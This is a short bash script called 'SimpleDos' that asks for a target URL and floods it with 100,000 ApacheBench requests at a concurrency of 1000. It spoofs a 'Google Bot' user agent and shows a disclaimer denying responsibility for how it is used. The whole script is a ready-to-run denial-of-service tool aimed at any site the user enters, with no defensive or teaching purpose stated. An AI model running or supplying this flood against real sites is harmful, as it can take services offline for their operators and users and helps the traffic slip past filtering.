#!/bin/bash
function logo {
toilet -s -w 150 -f mono12 -F metal SimpleDos
}
clear
logo
echo ""
echo -e "\e[31;1m		    I AM NOT RESPONSIBLE FOR HOW YOU WILL USE THIS PROGRAM!\e[0m"
echo " "
echo -e -n  "\e[32;1mEnter site to Dos [http[s]://]hostname[:port]/path] --> \e[0m"
read site
echo "Ctrl + C to stop Dos"
ab -n 100000 -c 1000 -k -r -H "User-Agent: Google Bot" $site > log
if [ -s log ]; then
rm -rf log
clear
logo
echo ""
echo -e  "\e[32;1m					Thanks for using!"
echo -e  '				Author --> https://github.com/Tanskicorp\e[0m'
echo ""
else
rm -rf log
clear
logo
echo ""
echo -e  "\e[31;1m				Error, wrong url, or hosting disabled"
echo -e ""
echo -e "		Write url behind the template --> http[s]://]hostname[:port]/path\e[0m"
echo ""
fi
